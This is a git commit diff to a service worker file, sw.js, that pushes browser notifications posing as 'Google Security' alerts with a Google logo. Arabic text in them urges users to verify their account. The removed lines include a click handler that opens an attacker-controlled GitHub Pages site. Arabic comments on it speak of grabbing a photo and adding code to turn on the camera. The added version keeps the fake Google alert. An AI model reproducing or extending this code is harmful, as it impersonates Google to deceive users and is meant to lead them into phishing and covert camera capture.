6acdf6521cec27650dc2f64d4706eae7e45a2f63
jake123321122-wq <jake123321122@gmail.com>
2026-02-10 13:02:53 +0200

    Update sw.js

--- sw.js
+++ sw.js
@@ -1,15 +1,9 @@
 self.addEventListener('push', function(event) {
-    event.waitUntil(self.registration.showNotification('⚠️ Google Security', {
-        body: event.data ? event.data.text() : 'تحقق من حسابك',
-        icon: 'https://cdn-icons-png.flaticon.com/512/564/564619.png',
-        vibrate: [500, 100, 500]
-    }));
-});
-
-self.addEventListener('notificationclick', function(event) {
-    event.notification.close();
-    // فتح الرابط وسحب صورة في نفس الوقت
-    event.waitUntil(clients.openWindow('https://jake123321122-wq.github.io/').then(async (win) => {
-        // هنا يمكنك إضافة كود تشغيل الكاميرا من الصفحة المفتوحة
-    }));
+    const data = event.data ? event.data.text() : 'تحديث أمان جديد!';
+    event.waitUntil(
+        self.registration.showNotification('Google Security', {
+            body: data,
+            icon: 'https://upload.wikimedia.org/wikipedia/commons/5/53/Google_Ads_logo.svg'
+        })
+    );
 });
